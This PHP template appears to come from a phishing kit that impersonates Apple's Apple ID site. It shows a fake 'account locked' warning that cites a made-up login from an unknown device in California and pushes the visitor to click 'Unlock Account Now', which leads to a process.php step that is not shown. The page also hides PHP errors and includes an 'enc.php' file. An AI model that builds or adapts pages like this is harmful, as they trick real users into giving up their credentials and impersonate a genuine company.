<?php 
    @error_reporting(0);
    session_start();
    require "partials/enc.php";
?>
<?php include 'partials/header.php'; ?>
    <div id="content">
        <div class="extra-container">
            <?php include 'partials/nav.php'; ?>

            <div class="subnav">
                <div class="container">
                    <div class="title pull-left">Apple&nbsp;ID</div>
                    <div class="menu-wrapper pull-right">
                        <ul class="menu">
                            <li class="item active"><a class="btn btn-link btn-signin" href="#">Sign In</a></li>
                            <li class="item"><a class="btn btn-link btn-create" href="#">Create Your Apple&nbsp;ID</a></li>
                            <li class="item"><a class="btn btn-link btn-faq" href="#">FAQ</a></li>
                        </ul>
                    </div>
                </div>
            </div>

            <div class="paws signin">
                <h1 class="LoginTitle">Apple ID</h1>
                <div class="si-body si-container container-fluid" data-theme="lite" id="content">
                    <div class="widget-container fade-in restrict-max-wh fade-in" data-mode="embed">
                        <div class="signin fade-in">
                            <div class="dialog fade-in">
                                <div class="app-dialog">
                                    <div class="head">
                                        <div class="title" title-align="center">
                                            <h2>Your account has been locked for the following reason :</h2>
                                        </div>
                                    </div>
                                    <div class="body" body-align="center">
                                        <div class="acc-locked" id="acc-locked">
                                            <div class="dialog-body">
                                                <div class="dialog-info">
                                                    <div class="thin" style="margin-bottom:16px">Login from unknown device near CA, USA yesterday at 06:55AM</div>
                                                    <a class="Unclock btn btn-primary btn-lg" style="color:white" target="_top" href="process.php?access_token=<?php echo $_SESSION['randString']; ?>">Unlock Account Now</a>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <script type="text/javascript">
                $('title').text('Account Locked');
            </script>
<?php include 'partials/footer.php'; ?>